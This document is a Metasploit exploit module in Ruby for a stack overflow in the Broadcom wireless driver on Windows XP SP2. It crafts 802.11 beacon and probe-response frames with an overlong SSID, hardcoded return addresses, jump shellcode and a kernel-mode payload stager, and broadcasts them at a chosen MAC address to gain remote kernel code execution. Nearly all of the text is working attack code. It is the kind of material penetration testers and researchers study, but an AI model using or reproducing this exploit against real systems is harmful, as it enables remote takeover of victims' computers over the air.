Broadcom Wireless Driver Probe Response SSID Overflow Exploit (meta)
====================================================================

require &#039;msf/core&#039;

module Msf

class Exploits::Windows::Driver::Broadcom_WiFi_SSID < Msf::Exploit::Remote

	include Exploit::Lorcon
	include Exploit::KernelMode	

	def initialize(info = {})
		super(update_info(info,	
			&#039;Name&#039;           => &#039;Broadcom Wireless Driver Probe Response SSID Overflow&#039;,
			&#039;Description&#039;    => %q{
				This module exploits a stack overflow in the Broadcom Wireless driver
			that allows remote code execution in kernel mode by sending a 802.11 probe
			response that contains a long SSID. The target MAC address must
			be provided to use this exploit. The two cards tested fell into the
			00:14:a5:06:XX:XX and 00:14:a4:2a:XX:XX ranges.

			This module depends on the Lorcon library and only works on the Linux platform
			with a supported wireless card. Please see the Ruby Lorcon documentation 
			(external/ruby-lorcon/README) for more information.			
			},
			
			&#039;Authors&#039;        => 
				[
					&#039;Chris Eagle&#039;,	# initial discovery
					&#039;Johnny Cache <johnnycsh [at] 802.11mercenary.com>&#039;, # the man with the plan
					&#039;skape&#039;, # windows kernel ninjitsu and debugging
					&#039;hdm&#039; # porting the C version to ruby
				],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision: 3583 $&#039;,
			&#039;References&#039;     =>
				[
					[&#039;URL&#039;, &#039;http://projects.info-pull.com/mokb/MOKB-11-11-2006.html&#039;],
				],
			&#039;Privileged&#039;     => true,
						
			&#039;DefaultOptions&#039; =>
				{
					&#039;EXITFUNC&#039; => &#039;thread&#039;,
				},

			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;    => 500
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;Targets&#039;        => 
				[
					# 5.1.2600.2622 (xpsp_sp2_gdr.050301-1519)
					[ &#039;Windows XP SP2 (5.1.2600.2122), bcmwl5.sys 3.50.21.10&#039;,
						{
							&#039;Ret&#039;      => 0x8066662c, # jmp edi
							&#039;Platform&#039; => &#039;win&#039;,
							&#039;Payload&#039;  => 
							{
								&#039;ExtendedOptions&#039; => 
								{
									&#039;Stager&#039;       => &#039;sud_syscall_hook&#039;,
									&#039;PrependUser&#039;  => "\x81\xC4\x54\xF2\xFF\xFF", # add esp, -3500
									&#039;Recovery&#039;     => &#039;idlethread_restart&#039;,
									&#039;KiIdleLoopAddress&#039; => 0x804dbb27,										
										
								}
							}
						} 
					],
					
					# 5.1.2600.2180 (xpsp_sp2_rtm_040803-2158)
					[ &#039;Windows XP SP2 (5.1.2600.2180), bcmwl5.sys 3.50.21.10&#039;,
						{
							&#039;Ret&#039;      => 0x804f16eb, # jmp edi
							&#039;Platform&#039; => &#039;win&#039;,
							&#039;Payload&#039;  => 
							{
								&#039;ExtendedOptions&#039; => 
								{
									&#039;Stager&#039;       => &#039;sud_syscall_hook&#039;,
									&#039;PrependUser&#039;  => "\x81\xC4\x54\xF2\xFF\xFF", # add esp, -3500
									&#039;Recovery&#039;     => &#039;idlethread_restart&#039;,
									&#039;KiIdleLoopAddress&#039; => 0x804dc0c7,
								}
							}
						} 
					]					
				],

			&#039;DefaultTarget&#039; => 0
			))
			
		register_options(
			[
				OptString.new(&#039;ADDR_DST&#039;, [ true,  "The MAC address of the target system",&#039;FF:FF:FF:FF:FF:FF&#039;]),
				OptInt.new(&#039;RUNTIME&#039;, [ true,  "The number of seconds to run the attack", 60])
			], self.class)
	end

	def exploit
		open_wifi
		
		stime = Time.now.to_i
		
		print_status("Sending beacons and responses for #{datastore[&#039;RUNTIME&#039;]} seconds...")
		
		while (stime + datastore[&#039;RUNTIME&#039;].to_i > Time.now.to_i) 
			
			select(nil, nil, nil, 0.02)
			wifi.write(create_response)

			select(nil, nil, nil, 0.01)
			wifi.write(create_beacon)
			
			break if session_created?
			
		end
		
		print_status("Finished sending frames...")
	end
	
	def create_beacon
		src = eton(&#039;90:e9:75:00:00:00&#039;) #relative jmp + 0x75 = stage2 HaHa. Tuned for ssid len = 93
		dst = eton(&#039;FF:FF:FF:FF:FF:FF&#039;)
		seq = [Time.now.to_i % 4096].pack(&#039;n&#039;)
	
		blob = create_frame
		blob[0,1] = 0x80.chr
		blob[4,6] = dst
		blob[10,6] = src
		blob[16,6] = src
		blob[22,2] = seq
		
		blob
	end
	
	def create_response
		src = eton(&#039;90:e9:75:00:00:00&#039;) #relative jmp + 0x75 = stage2 HaHa. Tuned for ssid len = 93
		dst = eton(datastore[&#039;ADDR_DST&#039;])
		seq = [Time.now.to_i % 256].pack(&#039;n&#039;)
	
		blob = create_frame
		blob[0,1] = 0x50.chr		
		blob[4,6] = dst
		blob[10,6] = src
		blob[16,6] = src # bssid field, good idea to set to src. 
		blob[22,2] = seq
		
		blob
	end

	def create_frame
		"\x80" +                      # type/subtype
		"\x00" +                      # flags
		"\x00\x00" +                  # duration  
		"\xff\xff\xff\xff\xff\xff" +  # dst
		"\x58\x58\x58\x58\x58\x58" +  # src
		"\x58\x58\x58\x58\x58\x58" +  # bssid
		"\x70\xed" +                  # sequence number
		
		#
		# fixed parameters
		#
		
		# timestamp value
		Rex::Text.rand_text_alphanumeric(8) + 
		"\x64\x00" +                  # beacon interval
		"\x11\x04" +                  # capability flags
		
		#
		# tagged parameters
		#
		
		# ssid tag
		"\x00" + # tag: SSID parameter set
		"\x5d" + # len: length is 93 bytes
		
		# jump into the payload
		"\x89\xf9" +                 # mov edi, ecx
		"\x81\xc1\x7b\x00\x00\x00" + # add ecx, 0x7b
		"\xff\xe1" +                 # jmp ecx
		
		# padding
		Rex::Text.rand_text_alphanumeric(79) + 
		
		# return address
		[target.ret].pack(&#039;V&#039;) +
		
		# vendor specific tag
		"\xdd" + # wpa
		"\xff" + # big as we can make it
		
		# the kernel-mode stager
		payload.encoded
	end
	
end
end



